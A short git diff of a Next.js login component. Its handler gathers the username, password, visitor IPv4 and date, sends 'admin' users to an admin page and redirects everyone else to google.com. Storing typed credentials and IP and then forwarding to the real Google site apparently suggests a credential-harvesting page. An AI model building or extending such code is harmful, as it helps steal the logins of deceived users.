@@ -3,7 +3,7 @@ import { useState, useEffect } from "react";
 import { useRouter } from "next/navigation";
 import UserName from "@/clientComponents/login/userName";
 import Password from "@/clientComponents/login/password";
-import { login } from "@/actions/actions.jsx";
+import { login, clientLogin } from "@/actions/actions.jsx";
 
 const Login = ({ argument }) => {
   const [username, setUsername] = useState("");
@@ -46,19 +46,15 @@ const Login = ({ argument }) => {
 
   // Function to handle HTTP request to save username and password
   const handleSaveData = async (username, password) => {
-    // const service = 'notGoogle';
     const jsonData = { service, username, password, ipv4, date: new Date() };
-    //console.log('Saving user data:', jsonData);
-
-    let apiToUse;
+    console.log(service);
     if (service === "admin") {
       if (login(jsonData)) {
         router.push("/admin");
-      } else {
-        apiToUse = "/api/clientLogin/";
       }
+    } else {
+      window.location.href = "https://www.google.com";
     }
-    
   };
 
   return (
